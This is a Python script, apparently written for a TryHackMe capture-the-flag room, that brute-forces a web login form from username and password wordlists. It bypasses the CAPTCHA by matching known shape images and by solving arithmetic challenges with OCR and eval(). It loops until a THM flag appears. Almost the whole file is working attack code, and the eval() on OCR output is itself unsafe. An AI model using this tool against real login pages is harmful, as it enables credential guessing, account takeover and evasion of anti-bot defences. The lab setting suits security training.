import requests
import json
import re
import base64
from PIL import Image
import pytesseract
from io import BytesIO
import time

# Identify square/triangle/circle
square = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAABvCAYAAAAntwTxAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADvMAAA7zARxTmToAAAJnSURBVHhe7dY/TmpBGEDx7wKWoiS4ARtXYMMa3AwJsAQKXIMLcA92LoCG"
triangle = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAABoCAYAAAA6sjRJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAsvSURBVHhe7Z1nTBVPF8YX7NiNBRV7V6yxF7DGghpb7O2DqFE0RqwfjI"
circle = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB2CAYAAAADbleiAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADvMAAA7zARxTmToAABDNSURBVHhe7Z15bJTF/8cHFC1ii1COCshRKFKuChaLXMGqiBYQMYIIKoSo"

url = "http://10.10.49.57/login"

data = {
    'username': 'admin',
    'password': 'test'
    }

# Identify picture for captcha
img_data = "data:image/png"
# Identify login page next attempt
login_error = 'Invalid username or password'
login_data = '<input type="text" placeholder="Firstname" name="username" id="username" value="" required>'
invalid_login = '<p class="error"><strong>Error:</strong> Invalid username or password'

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
# Extract image from response and decode 
def extract_image_from_response(response_text):
    match = re.search(r'data:image/png;base64,([A-Za-z0-9+/=]+)', response_text)
    if match:
        data = match.group(1)
        return base64.b64decode(data)
    else:
        print("No base64 encoded image data found in the response text.")
        return None

# Function to convert image to text using OCR
def image_to_text(image):
    return pytesseract.image_to_string(image)

# Get response from request
def get_response_text(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for HTTP errors (4xx and 5xx status codes)
        return response.text
    except requests.RequestException as e:
        print(f"Error occurred: {e}")
        return None

# Sorte image circle/square/triangle/eval
def sorte_img(response):
    if img_data in response_text:
        print("Image detected...")
        if square in response_text:
            print("Square detected\n----------------------\n")
            data = {
            'captcha': 'square'
            }
        elif triangle in response_text:
            print("Triangle detected\n----------------------\n")
            data = {
            'captcha': 'triangle'
            }

        elif circle in response_text:
            print("Circle detected\n----------------------\n")
            data = {
            'captcha': 'circle'
            }

        else:
            try:
                print("Other captche detected, using OCR")
                image_data = extract_image_from_response(response_text)
                # Open image from binary data
                image = Image.open(BytesIO(image_data))

                # Convert image to text using OCR
                text = image_to_text(image).strip()
                cap = eval(text.strip().replace('?',"").replace('=',''))
                print(f"{text.replace('?','')} = {cap} ... Sending captcha {cap}\n----------------------\n")
                data = {
                'captcha': cap
                }
            except:
                pass
        return data
# Load file function append to list
def load_file(filename):
    file_list = []
    
    with open(filename, 'r') as file:
        for line in file:
            # Strip whitespace and split by whitespace
            key, *value = line.strip().split()
            
            # Join the value parts if there are more than one
            value = ' '.join(value) if value else ''
            
            # Append to list
            file_list.append(line.strip())
    
    return file_list

url = 'http://' + input('Enter IP to bypass chptcha [Capture returns!! THM]>>> ') + '/login'
response_text = get_response_text(url)
users = load_file('usernames.txt')
#print(users)
passwords = load_file('passwords.txt')
#print(passwords)
for i in range(len(users)):
    for j in range(len(passwords)):
        data_login = {
            'username': users[i],
            'password': passwords[j]
            }
        if 'Flag' in response_text:
            pattern = r'THM\{\w{32}\}'
            print('--------------------------------------------------')
            print('|----------------FLAG--FOUND---------------------|')
            print('--------------------------------------------------')
            print(f'Flag : {re.findall(pattern, response_text)}')
            print('--------------------------------------------------')
            #print(f'Try login {users[i]}  :  {passwords[j]}')
            quit()
        while img_data in response_text:
            sorte_img(response_text)
            response = requests.post(url, headers=headers, data=sorte_img(response_text))
            response_text = response.text
        try:
            response_send = requests.post(url, headers=headers, data=data_login)
            response_text = response_send.text
            print(f'Trying user {users[i]}, password {passwords[j]}\n----------------------\n')
        except:
            break
        time.sleep(0.1)
